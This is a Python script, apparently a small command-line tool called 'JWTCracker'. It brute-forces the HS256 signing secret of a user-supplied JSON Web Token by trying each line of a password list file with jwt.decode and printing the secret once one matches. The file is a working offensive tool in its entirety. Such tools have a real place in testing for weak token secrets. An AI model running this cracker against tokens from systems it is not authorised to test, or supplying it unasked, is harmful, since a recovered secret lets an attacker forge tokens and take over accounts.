import jwt;
from colorconsole import terminal

screen = terminal.get_terminal(conEmu=False)
string = """      ___          _________ _____                _
     | \ \        / /__   __/ ____|              | |
     | |\ \  /\  / /   | | | |     _ __ __ _  ___| | _____ _ __
 _   | | \ \/  \/ /    | | | |    | '__/ _` |/ __| |/ / _ \ '__|
| |__| |  \  /\  /     | | | |____| | | (_| | (__|   <  __/ |
 \____/    \/  \/      |_|  \_____|_|  \__,_|\___|_|\_\___|_|
                                                              """
screen.cprint(10, 0, string+"\n")
screen.cprint(10, 0, "Make sure you have a password list named 'PasswordList.txt' in your folder\n")
encoded = input("Enter The Original JWT Token: ")
found = False

with open('PasswordList.txt') as secrets:
    for secret in secrets:
        try:
            payload = jwt.decode(encoded,secret.rstrip(), algorithms=['HS256'])
            screen.cprint(10, 0, 'Success! The Secret is: ' + secret.rstrip() + '\n')
            found = True
            break
        except jwt.ExpiredSignatureError:
            screen.cprint(4, 0, 'Token Expired\n')
        except jwt.InvalidTokenError:
            screen.cprint(4, 0, 'Failed to crack with the payload: ' + secret.rstrip() + '\n')
if (not found):
    screen.cprint(4, 0, 'Bruteforce has failed..\n')
screen.reset_colors()
print("Done!")
print("Press any key to exit")
try:
    while True:
        i = 0
except KeyboardInterrupt:
    pass
